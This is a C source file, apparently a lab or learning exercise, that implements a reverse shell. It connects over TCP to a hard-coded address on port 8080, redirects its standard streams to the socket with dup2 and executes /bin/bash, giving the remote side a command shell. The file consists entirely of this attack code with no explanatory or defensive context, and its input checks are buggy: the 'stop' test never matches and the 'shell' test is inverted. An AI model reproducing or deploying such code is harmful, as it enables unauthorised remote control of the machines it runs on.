#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <string.h>
#include <unistd.h>
#define PORT 8080

int main (int argc, char const *argv[]){
	
	struct sockaddr_in address;
	int sock = 0, valread; 
	struct sockaddr_in serv_addr;
	char *message = malloc(2048);
	char buffer[1024] = {0};
	
	while(0 < 1){
		//creating the socket
		if((sock = socket(AF_INET, SOCK_STREAM,0)) < 0){
			printf("\n Socket creating error \n");
			return -1;
		}
	
		//filling up temporatly the serv_addr with 0, until we get the actual
		//address
		//memset(&serv_addr, '0', sizeof(serv_addr));
	
		serv_addr.sin_family = AF_INET; //USING IP
		serv_addr.sin_port = htons(PORT); //USING PORT, which is 8080
	
		//printf("%d", serv_addr.sin_port);
		if(inet_pton(AF_INET, "172.16.11.149", &serv_addr.sin_addr) <=0){
		
			printf("\nwrong address\n");
			return -1;
	
		}

		if(connect(sock, (struct sockaddr *) &serv_addr, 
					sizeof(serv_addr)) < 0){
			printf("\nConnection Failed \n");
			return -1;
		}

		//get input from user
		fgets(message, 1024, stdin);
		if(!strcmp(message,"stop")){
			printf("bye!\n");
			exit(0);
		}

		else if(strcmp(message,"shell")){
			printf("GOT HERE\n");
			for (int i=0; i<3; i++){
				dup2(sock, i);
			}
		
			execve("/bin/bash", NULL, NULL);
		}


		//else{
			//send(sock, message, strlen(message), 0);
			//printf("Message Sent!\n");
		//}
	}
	return 0;
}
